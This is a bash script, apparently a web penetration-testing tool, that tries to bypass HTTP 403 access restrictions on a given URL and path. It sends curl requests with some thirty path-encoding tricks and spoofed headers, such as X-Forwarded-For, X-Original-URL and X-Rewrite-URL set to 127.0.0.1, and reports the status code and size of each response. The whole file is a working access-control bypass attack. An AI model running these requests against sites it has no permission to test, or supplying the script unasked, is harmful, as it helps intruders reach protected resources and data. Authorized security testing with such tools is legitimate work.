#! /bin/bash
args=$(getopt h $*)

function usage {
    echo "Usage:"
    echo "$0 [-h] https://example.com path"
    echo "Try to bypass 403 Access Denied."
    exit 2
}

if [ $? != 0 ]; then
    usage
fi

set -- $args
for i ; do
    case "$i"
    in
        -h) usage ; shift ;;
        --) shift ; break ;;
    esac
done

if [ $# != 2 ]; then
    usage
fi

# field separator is §
fuzz_list="$1/$2§$1/$2#§$1/$2%09§$1/$2%20§$1/$2%20/§$1/$2..;/§$1/$2.html§$1/$2/§$1/$2/.§$1/$2/.randomstring§$1/$2//§$1/$2/?anything§$1/$2?§$1/$2???§$1/%20$2%20/§$1/%2e/$2§$1/./$2/./§$1//$2//§-H \"Referer: /$2\" $1/$2§-H \"X-Client-IP: 127.0.0.1\" $1/$2§-H \"X-Custom-IP-Authorization: 127.0.0.1\" $1/$2§-H \"X-Forwarded-For: 127.0.0.1\" $1/$2§-H \"X-Forwarded-For: 127.0.0.1\" -H \"X-Forwarded-For: 127.0.0.1\" $1/$2§-H \"X-Forwarded-For: 127.0.0.1:80\" $1/$2§-H \"X-Forwarded-For: 127.0.0.1:80\" \"X-Forwarded-For: 127.0.0.1:80\" $1/$2§-H \"X-Forwarded-For: http://127.0.0.1\" $1/$2§-H \"X-Forwarded-Host: 127.0.0.1\" $1/$2§-H \"X-Host: 127.0.0.1\" $1/$2§-H \"X-Original-URL: $2\" $1/$2§-H \"X-Original-URL: /$2\" $1/$2anything§-H \"X-Originating-IP: 127.0.0.1\" $1/$2§-H \"X-Remote-IP: 127.0.0.1\" $1/$2§-H \"X-rewrite-url: $2\" $1§-H \"X-Rewrite-URL: /$2\" $1"


_FIELD_SEPARATOR=$IFS
IFS=§

for val in $fuzz_list; do
	echo "$val" | xargs curl --path-as-is -s -o /dev/null -iL -w "%{http_code}","%{size_download}"
	echo "  --> $val"
done

IFS=$_FIELD_SEPARATOR
